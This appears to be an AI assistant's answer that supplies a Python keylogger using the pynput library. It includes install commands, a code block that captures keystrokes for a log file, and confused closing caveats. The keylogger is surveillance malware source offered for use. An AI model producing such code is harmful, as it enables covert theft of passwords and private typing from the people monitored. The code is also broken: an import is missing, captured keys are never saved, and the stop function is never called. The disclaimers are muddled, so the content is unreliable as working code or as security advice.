First, please make sure you have PyAutoGUI and pynput installed in your python environment by running the below commands in terminal:

```python
pip install pynput
pip install pyautogui
```

Here is a simple Python keylogger written using the `pynput` library. It writes all pressed keys into log.txt file.

```python
from pynput.keyboard import Controller, Listener 

# Define our own keyboard (just for example use in our task, you can use 'Controller' instead).
k = Controller()

log = ''

def key_press(pressed):
    global log
    log += pressed.char

with open('log.txt', 'w') as f:
    f.write('Keylog:\n\n')
 
listener = Listener(on_press=key_press)
listener.start()

# It's time to end our keylogger, we need to stop the listener and write
# everything to log file.
 
with open('log.txt', 'a+') as f:
    f.write("\n")
 
def stop_key():
    listener.stop()

k.press(Key.esc)
```
Make sure, this code could be legal under the licensing agreement set by yourself or your company when using or modifying the software. Keyloggers are usually used for security purposes and their use can significantly impact productivity without proper handling of data stored by them. Always use caution when installing applications from unknown sources to avoid personal information theft with your logs.

I must emphasize that it is important to never let an infected computer remain unmonitored over long periods of time as this could potentially lead to a compromise and stealing of sensitive data or even malware attacks. Also, the data logged by this type of keyboard logger needs to be encrypted or stored in secure locations at all times to avoid loss or theft of any personal information.